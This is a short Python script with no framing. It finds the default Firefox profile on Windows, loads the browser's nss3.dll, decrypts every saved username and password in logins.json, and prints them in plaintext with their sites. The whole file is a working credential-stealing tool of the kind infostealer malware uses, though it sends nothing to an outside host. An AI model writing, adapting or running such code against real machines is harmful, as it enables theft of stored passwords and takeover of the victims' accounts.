import os
import sys
import json
import base64
import sqlite3
import ctypes
from configparser import ConfigParser
from ctypes import c_void_p, c_char_p, c_int, byref

class SECItem(ctypes.Structure):
    _fields_ = [("type", c_int), ("data", c_void_p), ("len", c_int)]

def find_default_profile():
    appdata = os.environ.get("APPDATA")
    ini_path = os.path.join(appdata, "Mozilla", "Firefox", "profiles.ini")
    if not os.path.exists(ini_path):
        print("[!] profiles.ini not found")
        return None

    config = ConfigParser()
    config.read(ini_path)

    for section in config.sections():
        if config.has_option(section, "Path") and config.get(section, "Path"):
            is_relative = config.getboolean(section, "IsRelative", fallback=True)
            path = config.get(section, "Path")
            if is_relative:
                full_path = os.path.join(appdata, "Mozilla", "Firefox", path)
            else:
                full_path = path

            if os.path.exists(os.path.join(full_path, "logins.json")):
                return full_path
    print("[!] No usable profile found in profiles.ini")
    return None

def load_nss(nss_path):
    os.environ['PATH'] += os.pathsep + nss_path
    try:
        return ctypes.CDLL("nss3.dll")
    except OSError:
        print("[!] Failed to load nss3.dll")
        return None

def initialize_nss(nss, profile_path):
    return nss.NSS_Init(profile_path.encode()) == 0

def decrypt_string(nss, b64_str):
    decoded = base64.b64decode(b64_str)
    input_item = SECItem(0, ctypes.cast(ctypes.create_string_buffer(decoded), c_void_p), len(decoded))
    output_item = SECItem()

    if nss.PK11SDR_Decrypt(byref(input_item), byref(output_item), None) == -1:
        return "[decryption failed]"

    return ctypes.string_at(output_item.data, output_item.len).decode('utf-8', errors="ignore")

def decrypt_firefox_passwords():
    profile = find_default_profile()
    if not profile:
        return []

    firefox_path = os.path.join(os.environ['ProgramFiles'], 'Mozilla Firefox')
    nss = load_nss(firefox_path)
    if not nss or not initialize_nss(nss, profile):
        return []

    logins_path = os.path.join(profile, "logins.json")
    with open(logins_path, "r", encoding="utf-8") as f:
        logins = json.load(f)

    results = []
    for login in logins.get("logins", []):
        url = login.get("hostname", "")
        user = decrypt_string(nss, login.get("encryptedUsername", ""))
        pw = decrypt_string(nss, login.get("encryptedPassword", ""))
        results.append(f"Site: {url}\nUsername: {user}\nPassword: {pw}\n")

    nss.NSS_Shutdown()
    return results

if __name__ == "__main__":
    creds = decrypt_firefox_passwords()
    if creds:
        print("\n".join(creds))
    else:
        print("[!] No credentials decrypted.")